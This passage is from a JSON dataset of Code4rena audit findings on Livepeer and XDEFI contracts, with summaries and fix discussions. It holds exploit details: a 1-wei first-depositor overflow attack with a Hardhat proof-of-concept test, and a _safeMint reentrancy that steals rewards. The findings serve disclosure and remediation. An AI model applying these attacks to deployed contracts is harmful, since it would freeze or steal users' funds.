      "content": "_Submitted by WatchPug, also found by gzeon, harleythedog, and Ruhum_.\n\nPer the `arb-bridge-eth` code:\n\n> all msg.value will deposited to callValueRefundAddress on L2\n\n- <https://github.com/OffchainLabs/arbitrum/blob/78118ba205854374ed280a27415cb62c37847f72/packages/arb-bridge-eth/contracts/bridge/Inbox.sol#L313>\n\n- <https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1ArbitrumMessenger.sol#L65-L74>\n\n```solidity\nuint256 seqNum = inbox.createRetryableTicket{value: _l1CallValue}(\n    target,\n    _l2CallValue,\n    maxSubmissionCost,\n    from,\n    from,\n    maxGas,\n    gasPriceBid,\n    data\n);\n```\n\nAt L308-L309, ETH held by `BridgeMinter` is withdrawn to L1Migrator:\n\n<https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L308-L309>\n\n```solidity\nuint256 amount = IBridgeMinter(bridgeMinterAddr)\n    .withdrawETHToL1Migrator();\n```\n\nHowever, when calling `sendTxToL2()` the parameter `_l1CallValue` is only the `msg.value`, therefore, the ETH transferred to L2 does not include any funds from `bridgeMinter`.\n\n<https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L318-L327>\n\n```solidity\nsendTxToL2(\n    l2MigratorAddr,\n    address(this), // L2 alias of this contract will receive refunds\n    msg.value,\n    amount,\n    _maxSubmissionCost,\n    _maxGas,\n    _gasPriceBid,\n    \"\"\n)\n```\n\nAs a result, due to lack of funds, `call` with value = amount to `l2MigratorAddr` will always fail on L2.\n\nSince there is no other way to send ETH to L2, all the ETH from `bridgeMinter` is now frozen in the contract.\n\n#### Recommendation\n\nChange to:\n\n```solidity\nsendTxToL2(\n    l2MigratorAddr,\n    address(this), // L2 alias of this contract will receive refunds\n    msg.value + amount, // the `amount` withdrawn from BridgeMinter should be added\n    amount,\n    _maxSubmissionCost,\n    _maxGas,\n    _gasPriceBid,\n    \"\"\n)\n```\n\n**[yondonfu (Livepeer) confirmed and resolved](https://github.com/code-423n4/2022-01-livepeer-findings/issues/205#issuecomment-1021378858):**\n > Fixed in https://github.com/livepeer/arbitrum-lpt-bridge/pull/51\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-livepeer-findings/issues/205#issuecomment-1025008573):**\n > Awesome find!\n\n\n\n \n",
      "summary": "\nThis bug report was submitted by WatchPug, gzeon, harleythedog, and Ruhum and was found in the `arb-bridge-eth` code. When `sendTxToL2()` is called, the parameter `_l1CallValue` is only the `msg.value`, meaning that the ETH transferred to L2 does not include any funds from `bridgeMinter`. This causes a lack of funds, making the `call` with value = amount to `l2MigratorAddr` fail on L2. As a result, all the ETH from `bridgeMinter` is now frozen in the contract.\n\nThe solution to this bug is to change the code to include the `amount` withdrawn from BridgeMinter in the `sendTxToL2()` parameter. This was confirmed and resolved by yondonfu (Livepeer) and was commented on by 0xleastwood (judge).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2022-01-livepeer",
      "github_link": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/205",
      "tags": [],
      "finders": []
    },
    {
      "id": "42445",
      "title": "[M-01] `_safeMint` Will Fail Due To An Edge Case In Calculating `tokenId` Using The `_generateNewTokenId` Function",
      "impact": "MEDIUM",
      "content": "_Submitted by leastwood, also found by cmichel, cmichel, egjlmn1, kenzo, MaCree, onewayfunction, sirhashalot, and WatchPug_\n\n#### Impact\n\nNFTs are used to represent unique positions referenced by the generated `tokenId`. The `tokenId` value contains the position's score in the upper 128 bits and the index wrt. the token supply in the lower 128 bits.\n\nWhen positions are unlocked after expiring, the relevant position stored in the `positionOf` mapping is deleted, however, the NFT is not. The `merge()` function is used to combine points in unlocked NFTs, burning the underlying NFTs upon merging. As a result, `_generateNewTokenId()` may end up using the same `totalSupply()` value, causing `_safeMint()` to fail if the same `amount_` and `duration_` values are used.\n\nThis edge case only occurs if there is an overlap in the `points_` and `totalSupply() + 1` values used to generate `tokenId`. As a result, this may impact a user's overall experience while interacting with the `XDEFI` protocol, as some transactions may fail unexpectedly.\n\n#### Proof of Concept\n```solidity\nfunction _lock(uint256 amount_, uint256 duration_, address destination_) internal returns (uint256 tokenId_) {\n    // Prevent locking 0 amount in order generate many score-less NFTs, even if it is inefficient, and such NFTs would be ignored.\n    require(amount_ != uint256(0) && amount_ <= MAX_TOTAL_XDEFI_SUPPLY, \"INVALID_AMOUNT\");\n\n    // Get bonus multiplier and check that it is not zero (which validates the duration).\n    uint8 bonusMultiplier = bonusMultiplierOf[duration_];\n    require(bonusMultiplier != uint8(0), \"INVALID_DURATION\");\n\n    // Mint a locked staked position NFT to the destination.\n    _safeMint(destination_, tokenId_ = _generateNewTokenId(_getPoints(amount_, duration_)));\n\n    // Track deposits.\n    totalDepositedXDEFI += amount_;\n\n    // Create Position.\n    uint96 units = uint96((amount_ * uint256(bonusMultiplier)) / uint256(100));\n    totalUnits += units;\n    positionOf[tokenId_] =\n        Position({\n            units: units,\n            depositedXDEFI: uint88(amount_),\n            expiry: uint32(block.timestamp + duration_),\n            created: uint32(block.timestamp),\n            bonusMultiplier: bonusMultiplier,\n            pointsCorrection: -_toInt256Safe(_pointsPerUnit * units)\n        });\n\n    emit LockPositionCreated(tokenId_, destination_, amount_, duration_);\n}\n```\n```solidity\nfunction _generateNewTokenId(uint256 points_) internal view returns (uint256 tokenId_) {\n    // Points is capped at 128 bits (max supply of XDEFI for 10 years locked), total supply of NFTs is capped at 128 bits.\n    return (points_ << uint256(128)) + uint128(totalSupply() + 1);\n}\n```\n\n```solidity\nfunction merge(uint256[] memory tokenIds_, address destination_) external returns (uint256 tokenId_) {\n    uint256 count = tokenIds_length;\n    require(count > uint256(1), \"MIN_2_TO_MERGE\");\n\n    uint256 points;\n\n    // For each NFT, check that it belongs to the caller, burn it, and accumulate the points.\n    for (uint256 i; i < count; ++i) {\n        uint256 tokenId = tokenIds_[i];\n        require(ownerOf(tokenId) == msg.sender, \"NOT_OWNER\");\n        require(positionOf[tokenId].expiry == uint32(0), \"POSITION_NOT_UNLOCKED\");\n\n        _burn(tokenId);\n\n        points += _getPointsFromTokenId(tokenId);\n    }\n\n    // Mine a new NFT to the destinations, based on the accumulated points.\n    _safeMint(destination_, tokenId_ = _generateNewTokenId(points));\n}\n```\n\n#### Recommended Mitigation Steps\n\nConsider replacing `totalSupply()` in `_generateNewTokenId()` with an internal counter. This should ensure that `_generateNewTokenId()` always returns a unique `tokenId` that is monotomically increasing .\n\n**[deluca-mike (XDEFI) confirmed](https://github.com/code-423n4/2022-01-xdefi-findings/issues/17#issuecomment-1012535766):**\n> In the release candidate contract, `_generateNewTokenId` now used an [internal `_tokensMinted` variable](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L36) instead of `totalSupply()`, as seen [here](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L393).\n**[Ivshti (Judge) commented](https://github.com/code-423n4/2022-01-xdefi-findings/issues/17#issuecomment-1013783639):**\n> Agreed with sponsor\n> \n> As for mitigation, the new way to generate token IDs seems cleaner, but more gas consuming\n\n",
      "summary": "\nThe bug report discusses an issue with the XDEFI protocol, where a specific edge case can cause transactions to fail unexpectedly. This occurs when positions are unlocked after expiring, but the corresponding NFT is not deleted. This can result in the same `tokenId` being used multiple times, causing `_safeMint()` to fail. The report suggests replacing `totalSupply()` with an internal counter to ensure unique `tokenId` values. The sponsor has confirmed that this has been addressed in the release candidate contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "XDEFI",
      "source_link": "https://code4rena.com/reports/2022-01-xdefi",
      "github_link": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/17",
      "tags": [],
      "finders": []
    },
    {
      "id": "42444",
      "title": "[H-01] Malicious early user/attacker can malfunction the contract and even freeze users' funds in edge cases",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug_\n\n<https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L151-L151>\n\n```solidity\n_pointsPerUnit += ((newXDEFI * _pointsMultiplier) / totalUnitsCached);\n```\n\nIn the current implementation,  `_pointsPerUnit` can be changed in `updateDistribution()` which can be called by anyone.\n\nA malicious early user can `lock()` with only `1 wei` of XDEFI and makes `_pointsPerUnit` to be very large, causing future users not to be able to `lock()` and/or `unlock()` anymore due to overflow in arithmetic related to `_pointsMultiplier`.\n\nAs a result, the contract can be malfunctioning and even freeze users' funds in edge cases.\n\n#### Proof of Concept\n\nGiven:\n\n*   bonusMultiplierOf\\[30 days] = 100\n\n1.  Alice `lock()` `1 wei` of XDEFI for 30 days as the first user of the contract. Got `1` units, and `totalUnits` now is `1`;\n2.  Alice sends `170141183460469 wei` of `XDEFI` to the contract and calls `updateDistribution()`:\n\n```solidity\n_pointsPerUnit += ((170141183460469 * 2**128) / 1);\n```\n\n3.  Bob tries to `lock()` `1,100,000 * 1e18` of `XDEFI` for 30 days, the tx will fail, as `_pointsPerUnit * units` overlows;\n4.  Bob `lock()` `1,000,000 * 1e18` of `XDEFI` for 30 days;\n5.  The rewarder sends `250,000 * 1e18` of `XDEFI` to the contract and calls `updateDistribution()`:\n\n```solidity\n_pointsPerUnit += ((250_000 * 1e18 * 2**128) / (1_000_000 * 1e18 + 1));\n```\n\n6.  30 days later, Bob tries to call `unlock()`, the tx will fail, as `_pointsPerUnit * units` overflows.\n\n#### Recommended Mitigation Steps\n\nUniswap v2 solved a similar problem by sending the first 1000 lp tokens to the zero address.\n\nThe same solution should work here, i.e., on constructor set an initial amount (like 1e8) for `totalUnits`\n\n<https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L39-L44>\n\n```solidity\nconstructor (address XDEFI_, string memory baseURI_, uint256 zeroDurationPointBase_) ERC721(\"Locked XDEFI\", \"lXDEFI\") {\n    require((XDEFI = XDEFI_) != address(0), \"INVALID_TOKEN\");\n    owner = msg.sender;\n    baseURI = baseURI_;\n    _zeroDurationPointBase = zeroDurationPointBase_;\n\n    totalUnits = 100_000_000;\n}\n```\n\n**[deluca-mike (XDEFI) confirmed](https://github.com/code-423n4/2022-01-xdefi-findings/issues/156#issuecomment-1008255566):**\n> This is a great catch! I just tested it:\n> \n> ```js\n> const { expect } = require(\"chai\");\n> const { ethers } = require(\"hardhat\");\n> \n> const totalSupply = '240000000000000000000000000';\n> \n> const toWei = (value, add = 0, sub = 0) => (BigInt(value) * 1_000_000_000_000_000_000n + BigInt(add) - BigInt(sub)).toString();\n> \n> describe(\"XDEFIDistribution\", () => {\n>     it(\"Can overflow _pointsPerUnit\", async () => {\n>         const [god, alice, bob] = await ethers.getSigners();\n> \n>         const XDEFI = await (await (await ethers.getContractFactory(\"XDEFI\")).deploy(\"XDEFI\", \"XDEFI\", totalSupply)).deployed();\n>         const XDEFIDistribution = await (await (await ethers.getContractFactory(\"XDEFIDistribution\")).deploy(XDEFI.address, \"https://www.xdefi.io/nfts/\", 0)).deployed();\n> \n>         // Give each account 2,000,000 XDEFI\n>         await (await XDEFI.transfer(alice.address, toWei(2_000_000))).wait();\n>         await (await XDEFI.transfer(bob.address, toWei(2_000_000))).wait();\n> \n>         // bonusMultiplierOf[30 days] = 100\n>         await (await XDEFIDistribution.setLockPeriods([2592000], [100])).wait();\n> \n>         // 1. Alice lock() 1 wei of XDEFI for 30 days as the first user of the contract. Got 1 units, and totalUnits now is 1;\n>         await (await XDEFI.connect(alice).approve(XDEFIDistribution.address, 1)).wait();\n>         await (await XDEFIDistribution.connect(alice).lock(1, 2592000, alice.address)).wait();\n>         expect(await XDEFIDistribution.balanceOf(alice.address)).to.equal('1');\n>         const nft1 = (await XDEFIDistribution.tokenOfOwnerByIndex(alice.address, 0)).toString();\n>         expect((await XDEFIDistribution.positionOf(nft1)).units).to.equal(1);\n> \n>         // 2. Alice sends 170141183460469 wei of XDEFI to the contract and calls updateDistribution()\n>         await (await XDEFI.connect(alice).transfer(XDEFIDistribution.address, 170141183460469)).wait();\n>         await (await XDEFIDistribution.connect(alice).updateDistribution()).wait();\n> \n>         // 3. Bob tries to lock() 1,100,000 * 1e18 of XDEFI for 30 days, the tx will fail, as _pointsPerUnit * units overflows\n>         await (await XDEFI.connect(bob).approve(XDEFIDistribution.address, toWei(1_100_000))).wait();\n>         await expect(XDEFIDistribution.connect(bob).lock(toWei(1_100_000), 2592000, bob.address)).to.be.revertedWith(\"_toInt256Safe failed\");\n> \n>         // 4. Bob lock() 1,000,000 * 1e18 of XDEFI for 30 days\n>         await (await XDEFI.connect(bob).approve(XDEFIDistribution.address, toWei(1_000_000))).wait();\n>         await (await XDEFIDistribution.connect(bob).lock(toWei(1_000_000), 2592000, bob.address)).wait();\n>         expect(await XDEFIDistribution.balanceOf(bob.address)).to.equal('1');\n>         const nft2 = (await XDEFIDistribution.tokenOfOwnerByIndex(bob.address, 0)).toString();\n>         expect((await XDEFIDistribution.positionOf(nft2)).units).to.equal(toWei(1_000_000));\n> \n>         // 5. The rewarder sends 250,000 * 1e18 of XDEFI to the contract and calls updateDistribution()\n>         await (await XDEFI.transfer(XDEFIDistribution.address, toWei(250_000))).wait();\n>         await (await XDEFIDistribution.updateDistribution()).wait();\n> \n>         // 6. 30 days later, Bob tries to call unlock(), the tx will fail, as _pointsPerUnit * units overflows.\n>         await hre.ethers.provider.send('evm_increaseTime', [2592000]);\n>         await expect(XDEFIDistribution.connect(bob).unlock(nft2, bob.address)).to.be.revertedWith(\"_toInt256Safe failed\");\n>     });\n> });\n> ```\n> \n> While I do like the suggestion to to `totalUnits = 100_000_000;` in the constructor, it will result \"uneven\" numbers due to the `totalUnits` offset. I wonder if I can resolve this but just reducing `_pointsMultiplier` to `uint256(2**96)` as per https://github.com/ethereum/EIPs/issues/1726#issuecomment-472352728.\n\n**[deluca-mike (XDEFI) commented](https://github.com/code-423n4/2022-01-xdefi-findings/issues/156#issuecomment-1008266150):**\n> OK, I think I can solve this with `_pointsMultiplier = uint256(2**72)`:\n> \n> ```js\n> const { expect } = require(\"chai\");\n> const { ethers } = require(\"hardhat\");\n> \n> const totalSupply = '240000000000000000000000000';\n> \n> const toWei = (value, add = 0, sub = 0) => (BigInt(value) * 1_000_000_000_000_000_000n + BigInt(add) - BigInt(sub)).toString();\n> \n> describe(\"XDEFIDistribution\", () => {\n>     it(\"Can overflow _pointsPerUnit\", async () => {\n>         const [god, alice, bob] = await ethers.getSigners();\n> \n>         const XDEFI = await (await (await ethers.getContractFactory(\"XDEFI\")).deploy(\"XDEFI\", \"XDEFI\", totalSupply)).deployed();\n>         const XDEFIDistribution = await (await (await ethers.getContractFactory(\"XDEFIDistribution\")).deploy(XDEFI.address, \"https://www.xdefi.io/nfts/\", 0)).deployed();\n> \n>         // Give each account 100M XDEFI\n>         await (await XDEFI.transfer(alice.address, toWei(100_000_000))).wait();\n>         await (await XDEFI.transfer(bob.address, toWei(100_000_000))).wait();\n> \n>         // bonusMultiplierOf[30 days] = 255\n>         await (await XDEFIDistribution.setLockPeriods([2592000], [255])).wait();\n> \n>         // 1. Alice lock() 1 wei of XDEFI for 30 days as the first user of the contract. Got 1 units, and totalUnits now is 1\n>         await (await XDEFI.connect(alice).approve(XDEFIDistribution.address, 1)).wait();\n>         await (await XDEFIDistribution.connect(alice).lock(1, 2592000, alice.address)).wait();\n>         expect(await XDEFIDistribution.balanceOf(alice.address)).to.equal('1');\n>         const nft1 = (await XDEFIDistribution.tokenOfOwnerByIndex(alice.address, 0)).toString();\n>         expect((await XDEFIDistribution.positionOf(nft1)).units).to.equal(2);\n> \n>         // 2. Alice sends 100M XDEFI minus 1 wei to the contract and calls updateDistribution()\n>         await (await XDEFI.connect(alice).transfer(XDEFIDistribution.address, toWei(100_000_000, 0, 1))).wait();\n>         await (await XDEFIDistribution.connect(alice).updateDistribution()).wait();\n> \n>         // 3. Bob can lock() 100M XDEFI for 30 days\n>         await (await XDEFI.connect(bob).approve(XDEFIDistribution.address, toWei(100_000_000))).wait();\n>         await (await XDEFIDistribution.connect(bob).lock(toWei(100_000_000), 2592000, bob.address)).wait();\n>         expect(await XDEFIDistribution.balanceOf(bob.address)).to.equal('1');\n>         const nft2 = (await XDEFIDistribution.tokenOfOwnerByIndex(bob.address, 0)).toString();\n>         expect((await XDEFIDistribution.positionOf(nft2)).units).to.equal(toWei(255_000_000));\n> \n>         // 4. The rewarder sends 40M XDEFI to the contract and calls updateDistribution()\n>         await (await XDEFI.transfer(XDEFIDistribution.address, toWei(40_000_000))).wait();\n>         await (await XDEFIDistribution.updateDistribution()).wait();\n> \n>         // 5. 30 days later, Bob can call unlock()\n>         await hre.ethers.provider.send('evm_increaseTime', [2592000]);\n>         await (await XDEFIDistribution.connect(bob).unlock(nft2, bob.address)).wait();\n>     });\n> });\n> ```\n\n**[deluca-mike (XDEFI) commented](https://github.com/code-423n4/2022-01-xdefi-findings/issues/156#issuecomment-1012773001):**\n> In the [release candidate contract](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol), in order to preserve the math (formulas), at the cost of some accuracy, we went with a [`_pointsMultiplier` of 72 bits](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L23).\n> \n> Also, a [minimum units locked](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L53) is enforced, to prevent \"dust\" from creating a very very high `_pointsPerUnit`.\n> \n> Tests were written in order to stress test the contract against the above extreme cases.\n> \n> Further, a \"no-going-back\" [emergency mode setter](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L100) was implemented that allows (but does not force) users to [withdraw only their deposits](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L147) without any of the funds distribution math from being expected, in the event that some an edge case does arise.\n\n**[Ivshti (Judge) commented](https://github.com/code-423n4/2022-01-xdefi-findings/issues/156#issuecomment-1013782548):**\n> fantastic finding, agreed with the proposed severity!\n> \n> The sponsor fixes seem adequate: a lower `_poinsMultiplier`, a minimum lock and an emergency mode that disables reward math, somewhat similar to emergency withdraw functions in contracts like masterchef.\n\n\n\n",
      "summary": "\nThis bug report is submitted by WatchPug and concerns a potential issue in the XDEFIDistribution contract. The code in question can be found at lines 151-151 in the link provided. The report explains that the current implementation allows for the `_pointsPerUnit` variable to be changed in the `updateDistribution()` function, which can be called by anyone. This could potentially be exploited by a malicious user who locks only 1 wei of XDEFI, causing the `_pointsPerUnit` to become very large and resulting in future users not being able to lock or unlock their funds due to overflow in the arithmetic. This could cause the contract to malfunction and even freeze user's funds in certain cases. The report provides a proof of concept and recommends a mitigation step of setting an initial amount for `totalUnits` in the constructor to prevent this issue. The report also includes comments from the XDEFI team confirming the bug and discussing potential fixes. The judge agrees with the severity of the bug and the proposed fixes provided by the sponsor. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "XDEFI",
      "source_link": "https://code4rena.com/reports/2022-01-xdefi",
      "github_link": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/156",
      "tags": [],
      "finders": []
    },
    {
      "id": "1256",
      "title": "[M-01] _safeMint Will Fail Due To An Edge Case In Calculating tokenId Using The _generateNewTokenId Function",
      "impact": "MEDIUM",
      "content": "## Handle\n\nleastwood\n\n\n## Vulnerability details\n\n## Impact\n\nNFTs are used to represent unique positions referenced by the generated `tokenId`. The `tokenId` value contains the position's score in the upper 128 bits and the index wrt. the token supply in the lower 128 bits.\n\nWhen positions are unlocked after expiring, the relevant position stored in the `positionOf` mapping is deleted, however, the NFT is not. The `merge()` function is used to combine points in unlocked NFTs, burning the underlying NFTs upon merging. As a result, `_generateNewTokenId()` may end up using the same `totalSupply()` value, causing `_safeMint()` to fail if the same `amount_` and `duration_` values are used.\n\nThis edge case only occurs if there is an overlap in the `points_` and `totalSupply() + 1` values used to generate `tokenId`. As a result, this may impact a user's overall experience while interacting with the `XDEFI` protocol, as some transactions may fail unexpectedly.\n\n## Proof of Concept\n\n```\nfunction _lock(uint256 amount_, uint256 duration_, address destination_) internal returns (uint256 tokenId_) {\n    // Prevent locking 0 amount in order generate many score-less NFTs, even if it is inefficient, and such NFTs would be ignored.\n    require(amount_ != uint256(0) && amount_ <= MAX_TOTAL_XDEFI_SUPPLY, \"INVALID_AMOUNT\");\n\n    // Get bonus multiplier and check that it is not zero (which validates the duration).\n    uint8 bonusMultiplier = bonusMultiplierOf[duration_];\n    require(bonusMultiplier != uint8(0), \"INVALID_DURATION\");\n\n    // Mint a locked staked position NFT to the destination.\n    _safeMint(destination_, tokenId_ = _generateNewTokenId(_getPoints(amount_, duration_)));\n\n    // Track deposits.\n    totalDepositedXDEFI += amount_;\n\n    // Create Position.\n    uint96 units = uint96((amount_ * uint256(bonusMultiplier)) / uint256(100));\n    totalUnits += units;\n    positionOf[tokenId_] =\n        Position({\n            units: units,\n            depositedXDEFI: uint88(amount_),\n            expiry: uint32(block.timestamp + duration_),\n            created: uint32(block.timestamp),\n            bonusMultiplier: bonusMultiplier,\n            pointsCorrection: -_toInt256Safe(_pointsPerUnit * units)\n        });\n\n    emit LockPositionCreated(tokenId_, destination_, amount_, duration_);\n}\n```\n\n```\nfunction _generateNewTokenId(uint256 points_) internal view returns (uint256 tokenId_) {\n    // Points is capped at 128 bits (max supply of XDEFI for 10 years locked), total supply of NFTs is capped at 128 bits.\n    return (points_ << uint256(128)) + uint128(totalSupply() + 1);\n}\n```\n\n```\nfunction merge(uint256[] memory tokenIds_, address destination_) external returns (uint256 tokenId_) {\n    uint256 count = tokenIds_.length;\n    require(count > uint256(1), \"MIN_2_TO_MERGE\");\n\n    uint256 points;\n\n    // For each NFT, check that it belongs to the caller, burn it, and accumulate the points.\n    for (uint256 i; i < count; ++i) {\n        uint256 tokenId = tokenIds_[i];\n        require(ownerOf(tokenId) == msg.sender, \"NOT_OWNER\");\n        require(positionOf[tokenId].expiry == uint32(0), \"POSITION_NOT_UNLOCKED\");\n\n        _burn(tokenId);\n\n        points += _getPointsFromTokenId(tokenId);\n    }\n\n    // Mine a new NFT to the destinations, based on the accumulated points.\n    _safeMint(destination_, tokenId_ = _generateNewTokenId(points));\n}\n```\n\n## Tools Used\n\nManual code review.\nDiscussions with Michael.\n\n## Recommended Mitigation Steps\n\nConsider replacing `totalSupply()` in `_generateNewTokenId()` with an internal counter. This should ensure that `_generateNewTokenId()` always returns a unique `tokenId` that is monotomically increasing .",
      "summary": "\nA bug was found in the `XDEFI` protocol which can cause some transactions to fail unexpectedly. This occurs when the `tokenId` value, which is used to represent unique positions referenced by the generated `tokenId`, contains the position's score in the upper 128 bits and the index wrt. the token supply in the lower 128 bits. When positions are unlocked after expiring, the relevant position stored in the `positionOf` mapping is deleted, however, the NFT is not. The `merge()` function is used to combine points in unlocked NFTs, burning the underlying NFTs upon merging. As a result, `_generateNewTokenId()` may end up using the same `totalSupply()` value, causing `_safeMint()` to fail if the same `amount_` and `duration_` values are used. This can happen if there is an overlap in the `points_` and `totalSupply() + 1` values used to generate `tokenId`.\n\nA manual code review and discussions with Michael were used to find the bug. To mitigate this issue, it is recommended to replace `totalSupply()` in `_generateNewTokenId()` with an internal counter, which should ensure that `_generateNewTokenId()` always returns a unique `tokenId` that is monotomically increasing.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "XDEFI",
      "source_link": "https://code4rena.com/reports/2022-01-xdefi",
      "github_link": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/17",
      "tags": [],
      "finders": [
        "sirhashalot",
        "onewayfunction",
        "cmichel",
        "leastwood",
        "WatchPug",
        "egjlmn1",
        "MaCree",
        "kenzo"
      ]
    },
    {
      "id": "1255",
      "title": "[H-02] The reentrancy vulnerability in _safeMint can allow an attacker to steal all rewards",
      "impact": "HIGH",
      "content": "_Submitted by cccz, also found by cmichel, Fitraldys, kenzo, onewayfunction, and tqts_\n\nThere is a reentrancy vulnerability in the \\_safeMint function\n```solidity\nfunction _safeMint(\n    address to,\n    uint256 tokenId,\n    bytes memory _data\n) internal virtual {\n    _mint(to, tokenId);\n    require(\n        _checkOnERC721Received(address(0), to, tokenId, _data),\n        \"ERC721: transfer to non ERC721Receiver implementer\"\n    );\n}\n...\nfunction _checkOnERC721Received(\n    address from,\n    address to,\n    uint256 tokenId,\n    bytes memory _data\n) private returns (bool) {\n    if (to.isContract()) {\n        try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {\n            return retval == IERC721Receiver.onERC721Received.selector;\n```\nThe lock function changes the totalDepositedXDEFI variable after calling the \\_safeMint function\n```solidity\nfunction lock(uint256 amount_, uint256 duration_, address destination_) external noReenter returns (uint256 tokenId_) {\n    // Lock the XDEFI in the contract.\n    SafeERC20.safeTransferFrom(IERC20(XDEFI), msg.sender, address(this), amount_);\n\n    // Handle the lock position creation and get the tokenId of the locked position.\n    return _lock(amount_, duration_, destination_);\n}\n...\n    function _lock(uint256 amount_, uint256 duration_, address destination_) internal returns (uint256 tokenId_) {\n    // Prevent locking 0 amount in order generate many score-less NFTs, even if it is inefficient, and such NFTs would be ignored.\n    require(amount_ != uint256(0) && amount_ <= MAX_TOTAL_XDEFI_SUPPLY, \"INVALID_AMOUNT\");\n\n    // Get bonus multiplier and check that it is not zero (which validates the duration).\n    uint8 bonusMultiplier = bonusMultiplierOf[duration_];\n    require(bonusMultiplier != uint8(0), \"INVALID_DURATION\");\n\n    // Mint a locked staked position NFT to the destination.\n    _safeMint(destination_, tokenId_ = _generateNewTokenId(_getPoints(amount_, duration_)));\n\n    // Track deposits.\n    totalDepositedXDEFI += amount_;\n```\n\nSince the updateDistribution function does not use the noReenter modifier, the attacker can re-enter the updateDistribution function in the \\_safeMint function. Since the value of totalDepositedXDEFI is not updated at this time, the \\_pointsPerUnit variable will become abnormally large.\n\n```solidity\n    function updateDistribution() external {\n       uint256 totalUnitsCached = totalUnits;\n\n       require(totalUnitsCached> uint256(0), \"NO_UNIT_SUPPLY\");\n\n       uint256 newXDEFI = _toUint256Safe(_updateXDEFIBalance());\n\n       if (newXDEFI == uint256(0)) return;\n\n       _pointsPerUnit += ((newXDEFI * _pointsMultiplier) / totalUnitsCached);\n\n       emit DistributionUpdated(msg.sender, newXDEFI);\n   }\n   ...\n   function _updateXDEFIBalance() internal returns (int256 newFundsTokenBalance_) {\n       uint256 previousDistributableXDEFI = distributableXDEFI;\n       uint256 currentDistributableXDEFI = distributableXDEFI = IERC20(XDEFI).balanceOf(address(this))-totalDepositedXDEFI;\n\n       return _toInt256Safe(currentDistributableXDEFI)-_toInt256Safe(previousDistributableXDEFI);\n   }\n\n```\n\nIf the attacker calls the lock function to get the NFT before exploiting the reentrance vulnerability, then the unlock function can be called to steal a lot of rewards, and the assets deposited by the user using the reentrance vulnerability can also be redeemed by calling the unlock function. Since the unlock function calls the \\_updateXDEFIBalance function, the attacker cannot steal the assets deposited by the user\n```solidity\n\nfunction unlock(uint256 tokenId_, address destination_) external noReenter returns (uint256 amountUnlocked_) {\n    // Handle the unlock and get the amount of XDEFI eligible to withdraw.\n    amountUnlocked_ = _unlock(msg.sender, tokenId_);\n\n    // Send the the unlocked XDEFI to the destination.\n    SafeERC20.safeTransfer(IERC20(XDEFI), destination_, amountUnlocked_);\n\n    // NOTE: This needs to be done after updating `totalDepositedXDEFI` (which happens in `_unlock`) and transferring out.\n    _updateXDEFIBalance();\n}\n...\nfunction _unlock(address account_, uint256 tokenId_) internal returns (uint256 amountUnlocked_) {\n    // Check that the account is the position NFT owner.\n    require(ownerOf(tokenId_) == account_, \"NOT_OWNER\");\n\n    // Fetch position.\n    Position storage position = positionOf[tokenId_];\n    uint96 units = position.units;\n    uint88 depositedXDEFI = position.depositedXDEFI;\n    uint32 expiry = position.expiry;\n\n    // Check that enough time has elapsed in order to unlock.\n    require(expiry != uint32(0), \"NO_LOCKED_POSITION\");\n    require(block.timestamp >= uint256(expiry), \"CANNOT_UNLOCK\");\n\n    // Get the withdrawable amount of XDEFI for the position.\n    amountUnlocked_ = _withdrawableGiven(units, depositedXDEFI, position.pointsCorrection);\n\n    // Track deposits.\n    totalDepositedXDEFI -= uint256(depositedXDEFI);\n\n    // Burn FDT Position.\n    totalUnits -= units;\n    delete positionOf[tokenId_];\n\n    emit LockPositionWithdrawn(tokenId_, account_, amountUnlocked_);\n}\n...\nfunction _withdrawableGiven(uint96 units_, uint88 depositedXDEFI_, int256 pointsCorrection_) internal view returns (uint256 withdrawableXDEFI_) {\n    return\n        (\n            _toUint256Safe(\n                _toInt256Safe(_pointsPerUnit * uint256(units_)) +\n                pointsCorrection_\n            ) / _pointsMultiplier\n        ) + uint256(depositedXDEFI_);\n}\n```\n\n#### Proof of Concept\n\n<https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-beta.0/contracts/XDEFIDistribution.sol#L253-L281>\n\n#### Recommended Mitigation Steps\n\n    -    function updateDistribution() external  {\n    +    function updateDistribution() external  noReenter {\n\n\n**[deluca-mike (XDEFI) 